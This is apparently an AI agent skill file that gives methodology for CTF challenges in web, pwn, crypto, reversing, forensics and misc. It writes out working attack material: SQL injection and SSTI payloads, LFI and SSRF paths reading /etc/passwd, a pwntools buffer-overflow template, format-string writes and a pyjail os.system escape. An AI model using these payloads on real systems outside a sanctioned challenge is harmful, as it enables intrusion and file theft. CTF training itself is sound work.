---
name: sentinel-ctf
description: Use for CTF (Capture The Flag) challenges — web exploitation, binary pwn, cryptography, reverse engineering, forensics, and misc. Invoke when user mentions "CTF", "flag{", "challenge", "HackTheBox", "TryHackMe", "PicoCTF", "pwn", or shares a challenge description asking how to solve it.
---

# Sentinel: CTF

CTF challenges are purpose-built security puzzles. Unlike real engagements, the goal is clear: **find the flag**.

**Core principle:** Identify the category, apply the methodology, iterate fast. CTF is a skill-building exercise — brute force guessing wastes time.

## Step 0: Classify the Challenge

Read the challenge description and determine category:

| Category | Indicators |
|----------|-----------|
| **Web** | URL given, mentions cookies/sessions/admin panel |
| **Pwn** | Binary file given, mentions buffer overflow, ROP, shellcode |
| **Crypto** | Ciphertext, encryption algorithm, key material given |
| **Reverse** | Executable to analyze, "find the password", no network |
| **Forensics** | Image/PCAP/file to analyze, "what happened", steganography |
| **Misc** | Doesn't fit above, often encoding/OSINT/jail escape |

Then jump to the relevant section below.

---

## Web Challenges

### Methodology
1. Spider the app — what pages, forms, parameters exist?
2. Check source code — comments, hidden inputs, JS files
3. Check cookies — base64? JWT? Serialized object?
4. Try obvious things — admin/admin, SQLi in login, directory traversal
5. Fuzz parameters — what inputs does the app accept?

### Common Web CTF Patterns

**SQL Injection:**
```sql
' OR '1'='1
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT table_name,NULL FROM information_schema.tables--
```

**LFI → RCE path:**
```
?page=../../../../etc/passwd          # verify LFI
?page=../../../../proc/self/environ   # try env poisoning
?page=php://filter/convert.base64-encode/resource=index.php  # read source
```

**PHP Type Juggling:**
```php
// "0e..." == "0e..." is TRUE in PHP loose comparison
// MD5 magic hashes: 240610708 → 0e462097431906509019562988736854
```

**SSTI (Server-Side Template Injection):**
```
{{7*7}}          # Jinja2/Twig — should output 49
${7*7}           # FreeMarker
<%= 7*7 %>       # ERB
{{config}}       # Jinja2 — dump config
{{''.__class__.__mro__[1].__subclasses__()}}  # Python object chain
```

**JWT attacks:**
```bash
# Decode without verification
echo "eyJ..." | base64 -d

# Try alg:none
# Change alg to "none", remove signature, keep trailing dot

# Try HS256 with public key as secret (RS256→HS256 confusion)
```

**SSRF in CTF:**
```
http://127.0.0.1/flag
http://localhost:8080/admin
http://[::]:80/
file:///etc/passwd
dict://127.0.0.1:6379/  # Redis
```

---

## Pwn (Binary Exploitation)

### Initial Analysis
```bash
file challenge          # Architecture, stripped?
checksec challenge      # What protections are enabled?
strings challenge | grep -i flag
ltrace ./challenge      # Library calls
strace ./challenge      # System calls
```

### Protection Reference
| Protection | Bypass Technique |
|-----------|-----------------|
| No NX | Shellcode injection |
| NX + No ASLR | ret2libc, ROP chain |
| NX + ASLR | Leak libc address first, then ret2libc |
| Canary | Leak or overwrite canary |
| Full RELRO | Can't overwrite GOT, target other structures |

### Buffer Overflow — Quick Path
```python
# Find offset with cyclic pattern
from pwn import *
cyclic(200)  # send this as input
# After crash: cyclic_find(0x6161616b)  # use crash address

# Basic 64-bit BOF template
from pwn import *

elf = ELF('./challenge')
p = process('./challenge')  # or remote('host', port)

offset = 72  # found via cyclic
ret_gadget = 0x...  # ROPgadget --binary challenge | grep ": ret"
win_func = elf.sym['win']  # or find manually

payload = b'A' * offset
payload += p64(ret_gadget)  # stack alignment for 64-bit
payload += p64(win_func)

p.sendline(payload)
p.interactive()
```

### Format String
```python
# Read arbitrary memory
payload = b'%p.' * 20        # leak stack values
payload = b'%7$s' + addr     # read string at position 7

# Write to address (printf %n)
payload = fmtstr_payload(offset, {target_addr: value})
```

### Heap Exploitation Quick Reference
- **Use-After-Free:** Access freed chunk via dangling pointer
- **Double Free:** Corrupt freelist to get overlapping allocations
- **Heap Overflow:** Overwrite adjacent chunk metadata

---

## Crypto Challenges

### Step 1: Identify the Algorithm
- Block cipher? (fixed-size ciphertext blocks) → AES, DES, Blowfish
- Stream cipher? (XOR keystream) → RC4, ChaCha20
- Asymmetric? (public key given) → RSA, ECC, ElGamal
- Custom/unknown? → look for patterns, frequency analysis

### RSA Common Attacks
```python
from Crypto.Util.number import *

# Small e (e=3) with small message — cube root
import gmpy2
m, exact = gmpy2.iroot(c, e)

# Same n, different e, same message — Common Modulus Attack
# Extended Euclidean: s1*e1 + s2*e2 = 1 → m = (c1^s1 * c2^s2) % n

# Factordb — try factoring n
# http://factordb.com/

# Wiener's attack — small d
# Use owiener library

# Hastad's Broadcast — same message encrypted to multiple recipients with e=3
# Chinese Remainder Theorem → take e-th root
```

### Classical Ciphers
```python
# Caesar / ROT — try all 25 shifts
for i in range(26):
    print(i, ''.join(chr((ord(c)-65+i)%26+65) if c.isalpha() else c for c in ct.upper()))

# Vigenère — find key length via Index of Coincidence or Kasiski
# XOR — if key repeats: crib drag, frequency analysis
# Rail Fence, Columnar Transposition — pattern-based
```

### XOR Patterns
```python
# Single-byte XOR
for k in range(256):
    result = bytes([b ^ k for b in ciphertext])
    if b'flag' in result or result.isascii():
        print(k, result)

# Repeating key XOR — find key length first
# Key length = where hamming distance is minimized
```

---

## Reverse Engineering

### Static Analysis First
```bash
file challenge
strings challenge | grep -E 'flag|CTF|key|pass'
objdump -d challenge | head -100
ghidra &   # open in Ghidra for decompilation
ida &       # IDA Pro if available
```

### Dynamic Analysis
```bash
ltrace ./challenge    # watch library calls
strace ./challenge    # watch syscalls
gdb ./challenge
  break main
  run
  disas main
  info registers
```

### GDB Shortcuts
```gdb
b *0x401234      # breakpoint at address
b main           # breakpoint at function
r < input.txt    # run with input
ni / si          # next instruction / step into
x/20x $rsp       # examine stack
p system         # print address of system
find &system, +9999999, "/bin/sh"  # find string in memory
```

### Angr (Symbolic Execution) — when logic is complex
```python
import angr
proj = angr.Project('./challenge', auto_load_libs=False)
state = proj.factory.entry_state(args=['./challenge'])
simgr = proj.factory.simgr(state)
simgr.explore(find=0x401234,  # address that prints "correct"
              avoid=0x401456)  # address that prints "wrong"
if simgr.found:
    print(simgr.found[0].posix.dumps(0))  # stdin that reached "found"
```

---

## Forensics / Steganography

### File Analysis
```bash
file suspicious
xxd suspicious | head -20    # check magic bytes
binwalk suspicious           # embedded files?
foremost suspicious          # file carving
exiftool suspicious          # metadata
strings suspicious | grep -i flag
```

### Image Steganography
```bash
steghide extract -sf image.jpg      # try empty password first
stegsolve                           # bit plane analysis (Java GUI)
zsteg image.png                     # LSB steg in PNG
outguess -r image.jpg output.txt
```

### PCAP Analysis
```bash
wireshark capture.pcap             # GUI analysis
tshark -r capture.pcap -Y "http"   # filter HTTP
tshark -r capture.pcap -T fields -e http.file_data  # extract data
strings capture.pcap | grep flag
```

### Encoding Quick Reference
```bash
# Base64
echo "SGVsbG8=" | base64 -d

# Hex
echo "48656c6c6f" | xxd -r -p

# Binary → ASCII
echo "01001000" | python3 -c "import sys; print(''.join(chr(int(b,2)) for b in sys.stdin.read().split()))"

# URL decode
python3 -c "from urllib.parse import unquote; print(unquote('%48%65%6c%6c%6f'))"
```

---

## Misc

### Common Misc Patterns
- **Jail escape (pyjail):** `__import__('os').system('cat flag')`
- **QR codes:** `zbarimg image.png`
- **Morse/Braille/Semaphore:** look for pattern, decode manually or use CyberChef
- **OSINT:** look for metadata, reverse image search, username search
- **Audio:** open in Audacity, check spectrogram view

### CyberChef
Use https://cyberchef.org for rapid encoding/decoding chains. It handles base64, hex, XOR, AES, and hundreds of other transforms visually.

---

## Flag Submission Checklist

Before declaring "no flag found":
- Did you check the source page comments?
- Did you try the obvious flag format? (`flag{}`, `CTF{}`, `picoCTF{}`)
- Did you decode/decompress the output?
- Did you try running the binary with `./challenge flag` as argument?
- Did you check all files in an archive, not just the obvious one?

## Integration

- For web challenge source code analysis: `sentinel:sentinel-audit`
- When a pwn challenge involves debugging: `superpowers:systematic-debugging`
